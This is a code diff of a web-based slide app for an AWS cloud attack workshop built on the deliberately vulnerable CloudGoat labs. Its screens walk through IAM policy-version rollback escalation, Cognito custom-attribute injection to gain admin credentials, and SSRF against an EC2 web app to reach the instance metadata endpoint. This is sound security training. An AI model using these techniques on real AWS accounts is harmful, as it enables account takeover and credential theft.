+// ═══ SCREENS (generated) ═══
+function buildScreens(){
+  const m=$('main');
+  m.innerHTML = SCREEN_HTML;
 }
-document.addEventListener('keydown', e => {
-  if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
-  if (e.key === 'ArrowRight') navigateTo(S.screen + 1);
-  else if (e.key === 'ArrowLeft') navigateTo(S.screen - 1);
-  else if (e.key >= '1' && e.key <= '9') navigateTo(+e.key);
+
+// ═══ NAV ═══
+function nav(id){
+  if(id===S.scr)return;clr();
+  const oid=S.scr;
+  if(oid){const o=document.querySelector(`#main .scr[data-id="${oid}"]`);if(o)o.classList.remove('active')}
+  const n=document.querySelector(`#main .scr[data-id="${id}"]`);
+  if(!n)return;
+  n.classList.add('active');S.scr=id;updSB(id);
+  const idx=FLAT.indexOf(id);$('topbar-fill').style.width=((idx+1)/FLAT.length*100)+'%';
+  initScr(id);
+}
+document.addEventListener('keydown',e=>{
+  if(e.target.tagName==='INPUT'||e.target.tagName==='SELECT')return;
+  const i=FLAT.indexOf(S.scr);
+  if(e.key==='ArrowRight'&&i<FLAT.length-1)nav(FLAT[i+1]);
+  else if(e.key==='ArrowLeft'&&i>0)nav(FLAT[i-1]);
 });
 
-// =================== COUNTER ANIMATION ===================
-function animateCounters() {
-  $$('#screen-1 .metric-value[data-count]').forEach(el => {
-    const target = +el.dataset.count, start = performance.now();
-    (function tick(now) {
-      const p = Math.min((now - start) / 1200, 1);
-      el.textContent = Math.round(target * (1 - Math.pow(1 - p, 3)));
-      if (p < 1) requestAnimationFrame(tick);
-    })(start);
+function cntUp(scope){
+  $$(scope+' .mv[data-count]').forEach(el=>{
+    const tgt=+el.dataset.count,st=performance.now();
+    (function tk(now){const p=Math.min((now-st)/1200,1);el.textContent=Math.round(tgt*(1-Math.pow(1-p,3)));if(p<1)requestAnimationFrame(tk)})(st);
   });
 }
 
-// =================== SCREEN INITIALIZERS ===================
-function initScreen(n) {
-  switch(n) {
-    case 1: animateCounters(); break;
-    case 2: initSetupWizard(); break;
-    case 3: initRecon(); break;
-    case 4: initEscalation(); break;
-    case 5: break;
-    case 6: initSSRF(); break;
-    case 7: break;
-    case 8: initKillChain(); break;
-    case 9: initNuke(); break;
-  }
+// ═══ SCREEN HTML (all screens) ═══
+const ISVG=`<svg viewBox="0 0 40 40"><path d="M20 4L6 12v16l14 8 14-8V12L20 4z" fill="none" stroke="currentColor" stroke-width="2"/><circle cx="20" cy="18" r="4" fill="none" stroke="currentColor" stroke-width="2"/><path d="M14 28c0-3.3 2.7-6 6-6s6 2.7 6 6" fill="none" stroke="currentColor" stroke-width="2"/></svg>`;
+const ESVG=`<svg viewBox="0 0 40 40"><rect x="8" y="8" width="24" height="24" rx="3" fill="none" stroke="currentColor" stroke-width="2"/><circle cx="20" cy="20" r="6" fill="none" stroke="currentColor" stroke-width="2"/></svg>`;
+const LSVG=`<svg viewBox="0 0 40 40"><path d="M8 32L16 8h4l5 14h-4l3 10H8z" fill="none" stroke="currentColor" stroke-width="2"/><path d="M24 22l8-14h-4" fill="none" stroke="currentColor" stroke-width="2"/></svg>`;
+const SSVG=`<svg viewBox="0 0 40 40"><ellipse cx="20" cy="12" rx="12" ry="4" fill="none" stroke="currentColor" stroke-width="2"/><path d="M8 12v16c0 2.2 5.4 4 12 4s12-1.8 12-4V12" fill="none" stroke="currentColor" stroke-width="2"/><ellipse cx="20" cy="20" rx="12" ry="4" fill="none" stroke="currentColor" stroke-width="2"/></svg>`;
+const CSVG=`<svg viewBox="0 0 40 40"><rect x="8" y="6" width="24" height="28" rx="4" fill="none" stroke="currentColor" stroke-width="2"/><circle cx="20" cy="16" r="4" fill="none" stroke="currentColor" stroke-width="2"/><path d="M13 28c0-3.9 3.1-7 7-7s7 3.1 7 7" fill="none" stroke="currentColor" stroke-width="2"/></svg>`;
+
+const SCREEN_HTML = `
+<div class="scr" data-id="1"><div class="tc" style="margin-top:24px"><div class="badge" style="justify-content:center">RSA Conference · Cloud Village</div><h1 class="ptitle" style="font-size:52px">AWS Cloud Attack Workshop</h1><p class="psub" style="margin:10px auto 44px;max-width:620px">Learn how minor AWS misconfigurations chain into full account compromise — through hands-on attack simulation.</p></div><div class="cg cg4" style="max-width:880px;margin:0 auto 44px"><div class="mc"><div class="mv" data-count="7">0</div><div class="ml">Attack Vectors</div></div><div class="mc"><div class="mv" data-count="5">0</div><div class="ml">AWS Services</div></div><div class="mc"><div class="mv" data-count="1">0</div><div class="ml">Kill Chain</div></div><div class="mc"><div class="mv" data-count="45">0</div><div class="ml">Minutes</div></div></div><div class="arch" style="max-width:880px;margin:0 auto 44px;gap:8px"><div class="an"><div class="ai aws-iam">${ISVG}</div><div class="an-l">IAM</div></div><div class="aarr">→</div><div class="an"><div class="ai aws-cog">${CSVG}</div><div class="an-l">Cognito</div></div><div class="aarr">→</div><div class="an"><div class="ai aws-ec2">${ESVG}</div><div class="an-l">EC2</div></div><div class="aarr">→</div><div class="an"><div class="ai aws-s3">${SSVG}</div><div class="an-l">S3</div></div><div class="aarr">→</div><div class="an"><div class="ai aws-lam">${LSVG}</div><div class="an-l">Lambda</div></div></div><div class="tc"><button class="btn btn1 pulse" onclick="nav('2')">Begin Workshop →</button></div></div>
+
+<div class="scr" data-id="2"><div class="badge">Introduction</div><h1 class="ptitle">Why Cloud Attack Labs?</h1><p class="psub">Cloud breaches are rising. Understanding attack patterns is the first step to building resilient defenses.</p><div class="cg cg3 mb-24"><div class="card tc"><div class="mv" style="font-size:36px" data-count="82">0</div><div class="ml">% of breaches involve cloud (2024)</div></div><div class="card tc"><div class="mv" style="font-size:36px" data-count="45">0</div><div class="ml">% caused by IAM misconfig</div></div><div class="card tc"><div class="mv" style="font-size:36px" data-count="12">0</div><div class="ml">avg min to full takeover</div></div></div><div class="cpan"><div class="cp knows"><div class="cp-label">What the Attacker Starts With</div><ul><li>Low-privilege AWS credentials</li><li>AWS CLI access</li><li>Knowledge of common misconfigurations</li></ul></div><div class="cp wants"><div class="cp-label">What the Attacker Wants</div><ul><li>Full <code>AdministratorAccess</code></li><li>Sensitive data from S3</li><li>Persistent backdoor access</li></ul></div></div><div class="callout insight"><strong>Workshop Approach:</strong> Each module uses CloudGoat — an open-source "vulnerable by design" AWS deployment tool by Rhino Security Labs.</div><div class="mt-24"><button class="btn btn1" onclick="nav('3')">Setup Pre-Reqs →</button></div></div>
+
+<div class="scr" data-id="3"><div class="badge">Prerequisites</div><h1 class="ptitle">Setting up Pre-Reqs</h1><p class="psub">Verify your environment has the required tools.</p><div class="cg cg2" style="max-width:800px"><div class="card"><h4>AWS CLI v2</h4><p style="font-size:13px;color:var(--tm)">Command-line interface for AWS</p><button class="btn btng btns mt-12" onclick="chkPre('aws')">Verify →</button><div class="mt-8" id="pre-aws"></div></div><div class="card"><h4>Python 3.x</h4><p style="font-size:13px;color:var(--tm)">Required for CloudGoat and boto3</p><button class="btn btng btns mt-12" onclick="chkPre('py')">Verify →</button><div class="mt-8" id="pre-py"></div></div><div class="card"><h4>Terraform</h4><p style="font-size:13px;color:var(--tm)">Infrastructure provisioning (optional)</p><button class="btn btng btns mt-12" onclick="chkPre('tf')">Verify →</button><div class="mt-8" id="pre-tf"></div></div><div class="card"><h4>Git</h4><p style="font-size:13px;color:var(--tm)">Clone repositories</p><button class="btn btng btns mt-12" onclick="chkPre('git')">Verify →</button><div class="mt-8" id="pre-git"></div></div></div><div class="mt-30"><button class="btn btn1" onclick="nav('4.1')">Setup AWS Accounts →</button></div></div>
+
+<div class="scr" data-id="4.1"><div class="badge">Setting up AWS Accounts</div><h1 class="ptitle">Access to AWS Console</h1><p class="psub">Log in to the AWS Management Console. Use an IAM user — never the root account.</p><div class="split"><div class="card"><h3>Console Access</h3><p style="font-size:14px;color:var(--t2)">The web-based interface for managing your AWS account.</p><div class="callout warning mt-16"><strong>Security:</strong> Root accounts have unrestricted access. Always create a dedicated IAM admin user.</div><button class="btn btn1 mt-16" onclick="nav('4.2')">Create IAM User →</button></div><div class="card" style="background:var(--bg3)"><h4 class="mb-12" style="color:var(--b)">Root vs IAM User</h4><div style="font-size:13px;color:var(--t2);line-height:1.7"><div class="mb-8"><strong style="color:var(--r)">Root</strong> — Full unrestricted access. Cannot be limited by policies.</div><div><strong style="color:var(--g)">IAM User</strong> — Permissions controlled by policies. Can be scoped, rotated, disabled.</div></div></div></div></div>
+
+<div class="scr" data-id="4.2"><div class="badge">Setting up AWS Accounts</div><h1 class="ptitle">Create IAM Admin User</h1><p class="psub">Create a dedicated admin user with programmatic and console access.</p><div class="split"><div><div class="card mb-16"><div class="mb-16"><label class="flbl">Username</label><input class="fi" id="iam-u" placeholder="e.g. iamadmin" autocomplete="off"><div class="ferr" id="iam-u-e">Username is required</div></div><div class="mb-16"><label class="flbl">Attach Policy</label><select class="fsel" id="iam-pol"><option value="">Select policy...</option><option value="AdministratorAccess">AdministratorAccess (Full)</option><option value="PowerUserAccess">PowerUserAccess (No IAM)</option><option value="ReadOnlyAccess">ReadOnlyAccess</option></select></div><div class="epan" id="iam-pol-e"><h4>Insufficient Permissions</h4><p id="iam-pol-em"></p><div class="fix">Select <strong>AdministratorAccess</strong> to continue.</div></div><button class="btn btn1" onclick="mkIAM()">Create User →</button></div><div class="callout danger" style="display:none" id="adm-w"><strong>Production Warning:</strong> AdministratorAccess grants unrestricted access. Use only for workshop purposes.</div></div><div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">AWS IAM</span></div><div class="tb2" id="t42"><span style="color:var(--td);font-style:italic">Waiting for input...</span></div></div></div></div></div>
+
+<div class="scr" data-id="4.3"><div class="badge">Setting up AWS Accounts</div><h1 class="ptitle">Access Using AWS CLI</h1><p class="psub">Configure credentials and verify your identity.</p><div class="split"><div><div class="card mb-16"><h4>Your Credentials</h4><div class="mt-12" style="font-size:13px;font-family:var(--mono);color:var(--t2);line-height:2">Access Key ID: <span style="color:var(--g)">AKIAIOSFODNN7EXAMPLE</span><br>Secret Key: <span style="color:var(--g)">wJalrXUtnFEMI/K7MDENG/bPx</span></div><div class="mt-12" style="font-size:12px;color:var(--td)">Type each value into the terminal.</div></div><div class="callout insight">Credentials stored in <code>~/.aws/credentials</code>. Use region <code>us-east-1</code> and output <code>json</code>.</div></div><div><div class="term focus"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">terminal — aws configure</span></div><div class="tb2" id="t43"></div><div class="thint" id="cli-h"><span class="hk">↵</span> submit <span style="margin-left:auto">Suggested: <span class="hc" id="cli-hc" onclick="cliHint()"></span></span></div></div></div></div></div>
+
+<div class="scr" data-id="5.1"><div class="badge">Student Environment</div><h1 class="ptitle">Setup Attacker Machine via Script</h1><p class="psub">Deploy vulnerable lab infrastructure using CloudGoat.</p><div class="split"><div class="card"><h3>Automated Deployment</h3><p style="font-size:13px;color:var(--t2)" class="mb-16">Clones CloudGoat, provisions all vulnerable infrastructure automatically.</p><div class="callout warning mt-16"><strong>Cost Notice:</strong> Lab resources incur charges. Run cleanup when finished.</div><button class="btn btn1 mt-16" onclick="runSetup()">Run Setup →</button></div><div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">terminal — setup</span></div><div class="tb2" id="t51"></div></div></div></div></div>
+
+<div class="scr" data-id="5.2"><div class="badge">Student Environment</div><h1 class="ptitle">Setup via Console</h1><p class="psub">Alternative: manually launch a pre-configured AMI.</p><div class="card" style="max-width:800px"><h3>Manual Steps</h3><div class="mt-16" style="font-size:14px;color:var(--t2);line-height:2"><strong>1.</strong> EC2 → AMIs → Public Images → Search workshop AMI<br><strong>2.</strong> Launch t2.micro, create key pair<br><strong>3.</strong> Security group: allow SSH (port 22)<br><strong>4.</strong> Enable auto-assign public IP<br><strong>5.</strong> SSH: <code>ssh -i key.pem ubuntu@&lt;ip&gt;</code><br><strong>6.</strong> Run <code>aws configure</code> inside the instance</div></div><div class="mt-24"><button class="btn btn1" onclick="nav('5.3')">Continue →</button></div></div>
+
+<div class="scr" data-id="5.3"><div class="badge">Student Environment</div><h1 class="ptitle">Timezone-Based Errors</h1><p class="psub">Fix clock sync issues that cause AWS signature errors.</p><div class="split"><div class="card"><h3>The Problem</h3><p style="font-size:13px;color:var(--t2)">AWS rejects requests if clock is off by >5 minutes: <code>SignatureDoesNotMatch</code></p><h4 class="mt-20">The Fix</h4><div style="font-size:13px;font-family:var(--mono);color:var(--t2);line-height:2;margin-top:8px">sudo apt install ntp<br>sudo ntpdate ntp.ubuntu.com<br>sudo service ntp restart</div></div><div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">terminal</span></div><div class="tb2" id="t53"></div></div></div></div><div class="mt-24"><button class="btn btn1" onclick="nav('6')">View Attack Surface →</button></div></div>
+
+<div class="scr" data-id="6"><div class="badge">Attack Surface</div><h1 class="ptitle">IAM, Cloud Compute, Serverless, Cognito</h1><p class="psub">Four attack domains — each targeting different AWS services and trust relationships.</p><div class="cg cg4 mb-30"><div class="card" style="cursor:pointer;border-top:3px solid var(--b)" onclick="nav('7.0')"><div class="ai aws-iam mb-8" style="width:36px;height:36px">${ISVG}</div><h4>IAM</h4><div style="font-size:12px;color:var(--tm)">Policy rollback, Cognito bypass</div><div class="mt-8"><span class="tag tag-crit">2 Vectors</span></div></div><div class="card" style="cursor:pointer;border-top:3px solid var(--a)" onclick="nav('8.0')"><div class="ai aws-ec2 mb-8" style="width:36px;height:36px">${ESVG}</div><h4>Cloud Compute</h4><div style="font-size:12px;color:var(--tm)">SSRF → Metadata → Cred theft</div><div class="mt-8"><span class="tag tag-crit">1 Chain</span></div></div><div class="card" style="cursor:pointer;border-top:3px solid var(--p)" onclick="nav('9.0')"><div class="ai aws-lam mb-8" style="width:36px;height:36px">${LSVG}</div><h4>Serverless</h4><div style="font-size:12px;color:var(--tm)">Lambda privilege escalation</div><div class="mt-8"><span class="tag tag-home">Assignment</span></div></div><div class="card" style="cursor:pointer;border-top:3px solid var(--r)" onclick="nav('10.0')"><div class="ai aws-nk mb-8" style="width:36px;height:36px"><svg viewBox="0 0 40 40"><circle cx="20" cy="20" r="12" fill="none" stroke="currentColor" stroke-width="2"/><line x1="12" y1="12" x2="28" y2="28" stroke="currentColor" stroke-width="2"/><line x1="28" y1="12" x2="12" y2="28" stroke="currentColor" stroke-width="2"/></svg></div><h4>Cloud-Nuke</h4><div style="font-size:12px;color:var(--tm)">Resource cleanup</div><div class="mt-8"><span class="tag tag-crit">Cleanup</span></div></div></div><div class="callout insight"><strong>Attack Path:</strong> Identity exploitation (IAM) → compute layers (EC2/SSRF) → serverless abuse (Lambda) — a single misconfigured policy cascading into full account takeover.</div><div class="mt-24"><button class="btn btn1" onclick="nav('7.0')">Begin with IAM →</button></div></div>
+
+<div class="scr" data-id="7.0"><div class="badge">AWS IAM</div><h1 class="ptitle">IAM Architecture Overview</h1><p class="psub">Understanding users, roles, policies, and the trust relationships attackers exploit.</p><div class="arch mb-24" style="gap:16px;padding:32px"><div class="tb" style="padding:24px 20px"><div class="tb-label">IAM Trust Boundary</div><div class="an"><div class="ai aws-iam"><svg viewBox="0 0 40 40" width="28" height="28"><circle cx="20" cy="16" r="5" fill="none" stroke="currentColor" stroke-width="2"/><path d="M12 30c0-4.4 3.6-8 8-8s8 3.6 8 8" fill="none" stroke="currentColor" stroke-width="2"/></svg></div><div class="an-l">User</div><div class="an-s">raynor</div></div><div class="aarr">→</div><div class="an"><div class="ai aws-iam"><svg viewBox="0 0 40 40" width="28" height="28"><rect x="8" y="8" width="24" height="24" rx="3" fill="none" stroke="currentColor" stroke-width="2"/><path d="M14 16h12M14 20h12M14 24h8" stroke="currentColor" stroke-width="2"/></svg></div><div class="an-l">Policy</div><div class="an-s">5 versions</div></div><div class="aarr atk">⚡</div><div class="an vuln"><div class="ai aws-iam"><svg viewBox="0 0 40 40" width="28" height="28"><rect x="8" y="8" width="24" height="24" rx="3" fill="none" stroke="currentColor" stroke-width="2"/><text x="20" y="23" text-anchor="middle" font-size="12" font-weight="800" fill="currentColor">v1</text></svg></div><div class="an-l" style="color:var(--r)">Hidden v1</div><div class="an-s" style="color:var(--r)">Action: *</div></div></div></div><div class="cpan"><div class="cp knows"><div class="cp-label">Attacker Knows</div><ul><li>IAM user credentials (limited)</li><li>Has <code>iam:Get*</code>, <code>iam:List*</code></li><li>Can call <code>SetDefaultPolicyVersion</code></li></ul></div><div class="cp wants"><div class="cp-label">Attacker Wants</div><ul><li>Find a policy version with <code>Action: *</code></li><li>Swap default version to escalate</li><li>Go from read-only to full admin</li></ul></div></div><div class="callout danger"><strong>The Flaw:</strong> AWS allows up to 5 policy versions. If an older version grants broader access and the user can call <code>SetDefaultPolicyVersion</code>, they can self-escalate.</div><div class="mt-24"><button class="btn btn1" onclick="nav('7.1')">View Misconfigurations →</button></div></div>
+
+<div class="scr" data-id="7.1"><div class="badge">AWS IAM</div><h1 class="ptitle">Misconfigurations with AWS IAM</h1><p class="psub">Common IAM misconfigurations that enable privilege escalation.</p><div class="cg cg2 mb-24"><div class="card" style="border-left:3px solid var(--r)"><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><h4 style="margin:0">Overly Permissive Wildcards</h4><span class="tag tag-crit">Critical</span></div><p style="font-size:13px;color:var(--t2)">Policies using <code>"Action": "*"</code> grant unrestricted access.</p></div><div class="card" style="border-left:3px solid var(--r)"><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><h4 style="margin:0">Unrestricted Role Assumption</h4><span class="tag tag-crit">Critical</span></div><p style="font-size:13px;color:var(--t2)"><code>sts:AssumeRole</code> on <code>"Resource": "*"</code> lets any user impersonate any role.</p></div><div class="card" style="border-left:3px solid var(--a)"><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><h4 style="margin:0">Policy Version Retention</h4><span class="tag tag-ec2">High</span></div><p style="font-size:13px;color:var(--t2)">Old versions with broader permissions remain accessible and exploitable.</p></div><div class="card" style="border-left:3px solid var(--a)"><div style="display:flex;align-items:center;gap:12px;margin-bottom:8px"><h4 style="margin:0">Missing MFA Enforcement</h4><span class="tag tag-ec2">High</span></div><p style="font-size:13px;color:var(--t2)">Sensitive actions without MFA allow full exploitation of compromised credentials.</p></div></div><div class="callout insight"><strong>Key Insight:</strong> Most IAM privilege escalation exploits <em>what the policy allows the user to do to the policy itself</em>.</div><div class="mt-24"><button class="btn btn1" onclick="nav('7.2')">Begin Rollback Attack →</button></div></div>
+
+<div class="scr" data-id="7.2"><div class="badge">Privilege Escalation via Rollback</div><h1 class="ptitle">Reconnaissance</h1><p class="psub">Enumerate policies and discover hidden versions with overly permissive rules.</p><div class="split swr"><div><h3 style="margin-bottom:10px">Findings</h3><div id="rf"><div id="f1" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--b);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700;margin-bottom:2px">User Identified</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">raynor-iam_privesc_by_rollback</div></div><div id="f2" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--b);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700;margin-bottom:2px">Policy Attached</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">cg-raynor-policy</div></div><div id="f3" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--a);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700;margin-bottom:2px">5 Policy Versions</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">v1, v2, v3, v4, v5 (default)</div></div><div id="f4" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--r);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700;margin-bottom:2px;color:var(--r)">v1 — Full Admin</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">"Action": "*", "Resource": "*"</div></div></div><button class="btn btn1 mt-20" id="b73" onclick="nav('7.3')" disabled>Launch Rollback →</button></div><div><div class="term focus"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">iam-recon</span></div><div class="tb2" id="t72"></div><div class="thint" id="rh"><span class="hk">↵</span> submit <span style="margin-left:auto">Next: <span class="hc" id="rhc" onclick="rHint()"></span></span></div></div></div></div></div>
+
+<div class="scr" data-id="7.3"><div class="badge">Privilege Escalation via Rollback</div><h1 class="ptitle">Exploitation</h1><p class="psub">Select the target version and execute the rollback.</p><div id="eb" class="fb dng mb-20">⚠ PRIVILEGE ESCALATED — Full AdministratorAccess</div><div class="split mb-20"><div><h4>Current (v5) — Restricted</h4><div class="pbox mt-8"><div class="phdr safe">v5 · Default</div><div class="pbdy">{<br>&nbsp;&nbsp;<span class="jk">"Action"</span>: [<span class="js">"iam:Get*"</span>, <span class="js">"iam:List*"</span>],<br>&nbsp;&nbsp;<span class="jk">"Resource"</span>: <span class="js">"*"</span><br>}</div></div></div><div><h4>Target (v1) — <span style="color:var(--r)">Full Admin</span></h4><div class="pbox mt-8"><div class="phdr dng">v1 · Hidden</div><div class="pbdy">{<br>&nbsp;&nbsp;<span class="jk">"Action"</span>: <span class="jd">"*"</span>,<br>&nbsp;&nbsp;<span class="jk">"Resource"</span>: <span class="jd">"*"</span><br>}</div></div></div></div><div class="card mb-20" id="vsel"><h4>Select Target Version</h4><p style="font-size:13px;color:var(--tm);margin-bottom:14px">Choose which version to activate.</p><div class="oc" style="grid-template-columns:repeat(5,1fr)"><div class="ocard" onclick="pkV(this,'v5')" style="text-align:center;padding:10px"><div class="oct">v5</div><div class="ocd">Default</div></div><div class="ocard" onclick="pkV(this,'v4')" style="text-align:center;padding:10px"><div class="oct">v4</div><div class="ocd">Limited</div></div><div class="ocard" onclick="pkV(this,'v3')" style="text-align:center;padding:10px"><div class="oct">v3</div><div class="ocd">Read</div></div><div class="ocard" onclick="pkV(this,'v2')" style="text-align:center;padding:10px"><div class="oct">v2</div><div class="ocd">Minimal</div></div><div class="ocard" onclick="pkV(this,'v1')" style="text-align:center;padding:10px;border-color:rgba(255,71,87,.2)"><div class="oct" style="color:var(--r)">v1</div><div class="ocd" style="color:var(--r)">Admin *:*</div></div></div><div class="epan" id="ve"><h4>Wrong Version</h4><p id="vem"></p><div class="fix">Look for <code>"Action": "*"</code> — that's v1.</div></div></div><div class="cbox dng" id="ec"><h4 style="color:var(--r)">⚠ Confirm Escalation</h4><p>Set default to <strong>v1</strong> granting full admin. Type <code>ESCALATE</code>.</p><div class="crow"><input class="fi" id="ei" placeholder="Type ESCALATE" autocomplete="off"><button class="btn btn1 btns" id="be" onclick="doEsc()" disabled>Execute</button></div></div><div class="term mt-16"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">escalation</span></div><div class="tb2" id="t73"></div></div><div class="mt-24"><button class="btn btn1" id="b74" onclick="nav('7.4')" disabled>Exploit Cognito →</button></div></div>
+
+<div class="scr" data-id="7.4"><div class="badge">Cognito Exploit</div><h1 class="ptitle">Cognito Attribute Injection</h1><p class="psub">Bypass validation, inject admin attributes, extract AWS credentials.</p><div class="arch mb-20" style="gap:12px;padding:24px"><div class="an"><div class="ai aws-cog"><svg viewBox="0 0 40 40" width="28" height="28"><rect x="8" y="6" width="24" height="28" rx="4" fill="none" stroke="currentColor" stroke-width="2"/><circle cx="20" cy="16" r="4" fill="none" stroke="currentColor" stroke-width="2"/></svg></div><div class="an-l">User Pool</div></div><div class="aarr atk">⚡ inject</div><div class="an vuln"><div class="ai aws-cog"><svg viewBox="0 0 40 40" width="28" height="28"><rect x="8" y="6" width="24" height="28" rx="4" fill="none" stroke="currentColor" stroke-width="2"/><text x="20" y="22" text-anchor="middle" font-size="10" font-weight="700" fill="currentColor">ID</text></svg></div><div class="an-l">Identity Pool</div></div><div class="aarr">→</div><div class="an"><div class="ai aws-iam">${ISVG}</div><div class="an-l">IAM Role</div></div></div><div class="ptabs"><div class="ptab act" onclick="cogP(1)">1 · Sign-up Bypass</div><div class="ptab" onclick="cogP(2)">2 · Attribute Injection</div><div class="ptab" onclick="cogP(3)">3 · Credential Extraction</div></div><div class="pcont act" id="cp1"><div class="split"><div class="card"><h4>Bypass Email Validation</h4><p style="font-size:13px;color:var(--t2)" class="mb-16">Frontend validates email client-side. Using CLI, we bypass it.</p><div class="mb-16"><label class="flbl">Email</label><input class="fi" id="ce" placeholder="attacker@evil.com" autocomplete="off"></div><div class="mb-16"><label class="flbl">Password</label><input class="fi" id="cpw" placeholder="Attack3r!Pass" autocomplete="off"></div><button class="btn btn1" onclick="cogSign()">Sign Up →</button></div><div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">cognito</span></div><div class="tb2" id="tc1"></div></div></div></div></div><div class="pcont" id="cp2"><div class="split"><div class="card"><h4>Inject Admin Attribute</h4><p style="font-size:13px;color:var(--t2)" class="mb-16">Set <code>custom:access</code> to <code>admin</code>.</p><div class="mb-16"><label class="flbl">Attribute</label><select class="fsel" id="cat"><option value="">Select...</option><option value="custom:access">custom:access</option><option value="custom:role">custom:role</option><option value="email_verified">email_verified</option></select></div><div class="mb-16"><label class="flbl">Value</label><input class="fi" id="cav" placeholder="admin" autocomplete="off"></div><div class="epan" id="cae"><h4>Wrong Attribute or Value</h4><p id="caem"></p><div class="fix">Use <code>custom:access</code> with value <code>admin</code>.</div></div><button class="btn btn1" onclick="cogInj()">Inject →</button></div><div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">cognito</span></div><div class="tb2" id="tc2"></div></div></div></div></div><div class="pcont" id="cp3"><div class="split"><div class="card"><h4>Extract Credentials</h4><p style="font-size:13px;color:var(--t2)" class="mb-16">Identity Pool grants elevated temp AWS credentials.</p><button class="btn btn1 mb-16" onclick="cogExt()">Extract →</button><div class="cbox ok" id="ccr"><h4 style="color:var(--g)">Temp Credentials Obtained</h4><div style="font-family:var(--mono);font-size:12px;color:var(--tm);line-height:1.8;margin-top:8px">AccessKeyId: <span style="color:var(--a)">ASIAZ3EXAMPLE7COGNITO</span><br>SecretKey: <span style="color:var(--a)">wJalr+CognitoTemp/K7MDENG</span><br>Token: <span style="color:var(--a)">IQoJb3JpZ2lu...truncated</span></div></div></div><div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">cognito</span></div><div class="tb2" id="tc3"></div></div></div></div></div><div class="mt-24"><button class="btn btn1" id="b80" onclick="nav('8.0')" disabled>Attack EC2 →</button></div></div>
+
+<div class="scr" data-id="8.0"><div class="badge">Cloud Compute</div><h1 class="ptitle">EC2 Attack Architecture</h1><p class="psub">SSRF → Metadata → Credential Theft attack chain.</p><div class="arch mb-24" style="gap:16px;padding:32px"><div class="an"><div class="an-l" style="font-size:11px;color:var(--td)">Attacker</div><div class="ai" style="color:var(--r)"><svg viewBox="0 0 40 40" width="28" height="28"><circle cx="20" cy="14" r="6" fill="none" stroke="currentColor" stroke-width="2"/><path d="M10 34c0-5.5 4.5-10 10-10s10 4.5 10 10" fill="none" stroke="currentColor" stroke-width="2"/></svg></div></div><div class="aarr atk">→ SSRF</div><div class="tb" style="padding:20px 18px"><div class="tb-label">EC2 Instance</div><div class="an vuln"><div class="ai aws-ec2"><svg viewBox="0 0 40 40" width="24" height="24"><rect x="8" y="8" width="24" height="24" rx="3" fill="none" stroke="currentColor" stroke-width="2"/><text x="20" y="23" text-anchor="middle" font-size="9" fill="currentColor">?url=</text></svg></div><div class="an-l">Web App</div></div><div class="aarr">→</div><div class="an"><div class="ai" style="color:var(--cy)"><svg viewBox="0 0 40 40" width="24" height="24"><rect x="8" y="8" width="24" height="24" rx="3" fill="none" stroke="currentColor" stroke-width="2"/><text x="20" y="22" text-anchor="middle" font-size="7" fill="currentColor">169.*</text></svg></div><div class="an-l">IMDS</div></div></div><div class="aarr">→</div><div class="an"><div class="ai aws-s3"><svg viewBox="0 0 40 40" width="24" height="24"><ellipse cx="20" cy="12" rx="10" ry="4" fill="none" stroke="currentColor" stroke-width="2"/><path d="M10 12v14c0 2.2 4.5 4 10 4s10-1.8 10-4V12" fill="none" stroke="currentColor" stroke-width="2"/></svg></div><div class="an-l">S3</div></div></div><div class="callout danger"><strong>Vulnerability:</strong> Web app has <code>?url=</code> parameter (SSRF). Combined with IMDSv1, attacker steals the EC2 instance's IAM role credentials via <code>169.254.169.254</code>.</div><div class="cpan mt-20"><div class="cp knows"><div class="cp-label">Attacker Knows</div><ul><li>EC2 IP: <code>54.234.112.87</code></li><li>URL param: <code>?url=</code></li><li>IMDS: <code>169.254.169.254</code></li></ul></div><div class="cp wants"><div class="cp-label">Attacker Wants</div><ul><li>IAM role credentials from metadata</li><li>S3 bucket access</li><li>Admin credentials in S3</li></ul></div></div><div class="mt-24"><button class="btn btn1" onclick="nav('8.1')">Begin SSRF →</button></div></div>
+
